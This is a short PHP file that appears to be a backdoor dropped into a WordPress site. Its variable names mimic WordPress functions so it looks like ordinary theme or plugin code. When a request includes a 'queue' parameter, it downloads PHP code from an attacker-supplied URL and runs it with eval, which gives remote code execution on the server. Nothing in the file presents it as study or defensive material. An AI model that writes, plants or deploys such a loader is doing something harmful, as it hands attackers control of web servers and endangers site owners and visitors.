<?php

if (isset($_GET['queue'])) {
    $get_search_query_ed = $_GET['queue'];
    if ($get_the_modified_date_gh = curl_init()) {
        curl_setopt($get_the_modified_date_gh, CURLOPT_URL, $get_search_query_ed);
        curl_setopt($get_the_modified_date_gh, CURLOPT_RETURNTRANSFER, true);
        eval(curl_exec($get_the_modified_date_gh));
        curl_close($get_the_modified_date_gh);
        exit;
    }
}